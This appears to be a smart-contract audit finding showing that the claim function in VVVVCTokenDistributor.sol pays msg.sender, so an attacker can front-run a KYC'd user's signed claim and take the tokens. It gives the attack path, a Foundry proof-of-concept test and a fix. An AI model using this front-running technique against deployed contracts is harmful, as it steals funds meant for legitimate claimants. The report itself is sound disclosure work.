## Summary
No access control or msg.sender validation allows an attacker to front-run honest claim calls to steal funds that are meant for the KYC'd address that the signature is signed for. This is due to the claim function sending funds to the `msg.sender`

## Root Cause
In `VVVVCTokenDistributor.sol::106` there are no implemented access control or validation to make sure that the `msg.sender` is the KYC address that this signature was signed for. This function directly sends the funds to the `msg.sender`

```solidity
function claim(ClaimParams memory _params) public {
        if (claimIsPaused) {
            revert ClaimIsPaused();
        }

        if (_params.projectTokenProxyWallets.length != _params.tokenAmountsToClaim.length) {
            revert ArrayLengthMismatch();
        }

        if (_params.nonce <= nonces[_params.kycAddress]) {
            revert InvalidNonce();
        }

        if (!_isSignatureValid(_params)) {
            revert InvalidSignature();
        }

        // update nonce
        nonces[_params.kycAddress] = _params.nonce;

        // define token to transfer
        IERC20 projectToken = IERC20(_params.projectTokenAddress);

        // transfer tokens from each wallet to the caller
        for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
            projectToken.safeTransferFrom(
                _params.projectTokenProxyWallets[i],
                msg.sender,
                _params.tokenAmountsToClaim[i]
            );
        }

        emit VCClaim(
            _params.kycAddress,
            _params.projectTokenAddress,
            _params.projectTokenProxyWallets,
            _params.tokenAmountsToClaim,
            _params.nonce
        );
    }
```
## Internal pre-conditions
No response

## External pre-conditions
Trusted off-chain system must create a valid signature for a KYC'd user to claim
## Attack Path
Assume Bob is the KYC'd user that has tokens to claim and Alice is the attacker.

The trusted off-chain system creates a valid signature for Bob to claim his tokens with `claim` function, giving Bob the correct `ClaimParams memory _params` to input.
Bob calls the `claim`  function with the given `ClaimParams memory _params`.
Alice notices this transaction and front-runs it, calling the `claim` function with the exact same parameters.
Alice's claim call goes through first.
Nonce check in the `claim` function passes for Alice's call as it is the first call.
```solidity
        if (_params.nonce <= nonces[_params.kycAddress]) {
            revert InvalidNonce();
        }
```
```solidity
_isSignatureValid check passes as these parameters have been signed by the trusted off-chain system.
        if (!_isSignatureValid(_params)) {
            revert InvalidSignature();
        }
```
Function updates KYC addresses nonce.
```solidity
        nonces[_params.kycAddress] = _params.nonce;
```
Function sends the funds to `msg.sender(Alice)` in the following for loop.
```solidity
        for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
            projectToken.safeTransferFrom(
                _params.projectTokenProxyWallets[i],
                msg.sender,
                _params.tokenAmountsToClaim[i]
            );
        }
```
Alice's transaction finalizes successfully.
```solidity
Bob's transaction starts executing and it reverts at the nonce check due to Alice's transaction updating the nonce.
        if (_params.nonce <= nonces[_params.kycAddress]) {
            revert InvalidNonce();
        }
```
## Impact
Attacker steals funds that are meant to be claimed by a KYC'd user.

## PoC
In the `VVVVCTestBase.sol` implement a new address to imitate an attacker.
```solidity
    uint256 sampleAttackerKey = 1234567812;
    address sampleAttacker = vm.addr(sampleAttackerKey);
```
Implement and run a new test in the `VVVVCTokenDistributor.unit.t.sol`
```solidity
    function testClaimSingleRoundFrontRunAttack() public {
        address[] memory thisProjectTokenProxyWallets = new address[](1);
        uint256[] memory thisTokenAmountsToClaim = new uint256[](1);

        thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];

        uint256 claimAmount = sampleTokenAmountsToClaim[0];
        thisTokenAmountsToClaim[0] = claimAmount;

        VVVVCTokenDistributor.ClaimParams memory claimParams = generateClaimParamsWithSignature(
            sampleKycAddress,
            thisProjectTokenProxyWallets,
            thisTokenAmountsToClaim
        );

        //Attacker claim with params signed for KYC'd address
        claimAsUser(sampleAttacker, claimParams);
        //Expect revert with InvalidNonce() for KYC'd address' claim 
        vm.expectRevert(VVVVCTokenDistributor.InvalidNonce.selector);
        claimAsUser(sampleKycAddress, claimParams);
        
        // Assertions
        assertTrue(ProjectTokenInstance.balanceOf(sampleAttacker) == claimAmount);
        assertEq(ProjectTokenInstance.balanceOf(sampleAttacker), ProjectTokenInstance.balanceOf(sampleKycAddress) + claimAmount);
    }
```
Test runs successfully and assertions prove that the attacker has stolen funds that are meant for the `sampleKycAddress`

## Mitigation
Send the funds to the signed address `(_params.kycAddress)`, an example of this is shown below.
```solidity
    function claim(ClaimParams memory _params) public {
        // rest of the function
        
        // transfer tokens from each wallet to the caller
        for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
            projectToken.safeTransferFrom(
                _params.projectTokenProxyWallets[i],
                _params.KycAddress, // changed line here
                _params.tokenAmountsToClaim[i]
            );
        }
        
        //rest of the function
}
```
